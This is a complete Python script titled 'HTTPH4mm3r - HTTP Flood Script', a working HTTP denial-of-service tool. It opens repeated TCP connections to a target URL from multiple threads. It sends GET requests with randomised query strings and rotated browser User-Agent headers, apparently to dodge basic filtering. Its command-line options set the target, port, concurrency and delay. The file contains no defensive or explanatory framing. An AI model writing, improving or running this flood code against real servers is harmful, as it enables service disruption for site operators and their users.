import socket
import threading
import argparse
import os
import random
import time
from urllib.parse import urlparse

# Global variables 
TARGET_URL = ""  # Global variable to store the full URL
TARGET_HOST = "" # Global variable to store the hostname
TARGET_PORT = 80  # Global variable to store the port
request_counter = 0  # Counter to track number of requests sent

# List of User-Agent headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Function to send HTTP requests
def http_flood(delay):
    global request_counter
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
            s.connect((TARGET_HOST, TARGET_PORT))  # Connect to the server
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))  # Send GET request
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode("utf-8"))  # Send random User-Agent header
            s.send(b"\r\n")  # End of headers
            s.recv(1024)  # Receive data (1024 bytes)
            request_counter += 1 
            s.close()
            time.sleep(delay)  # Add delay between requests
        except socket.error:
            continue

def main():
    global TARGET_HOST, TARGET_PORT, TARGET_URL 
    
    # Parse the command line arguments
    parser = argparse.ArgumentParser(description="HTTPH4mm3r - HTTP Flood Script")
    parser.add_argument('-c', '--concurrent', type=int, default=2, help="Number of concurrent requests.")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL for the attack.")
    parser.add_argument('-p', '--port', type=int, default=80, help="Port of the target server.")
    parser.add_argument('-d', '--delay', type=float, default=0, help="Delay between requests for each thread (in seconds).")
    args = parser.parse_args()

    parsed_url = urlparse(args.url)  # Parse the provided URL
    TARGET_URL = args.url  # Store the full URL
    TARGET_HOST = parsed_url.hostname  # Extract the hostname
    TARGET_PORT = args.port

    try:
        threads = []
        for _ in range(args.concurrent):  # Create the threads
            t = threading.Thread(target=http_flood, args=(args.delay,))  # Create a thread for each request
            t.daemon = True  # Set thread as a daemon thread so it can be stopped easily using Ctrl+C
            t.start()
            threads.append(t)

        while any(t.is_alive() for t in threads):
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nStopping attack...")

if __name__ == "__main__":
    main()
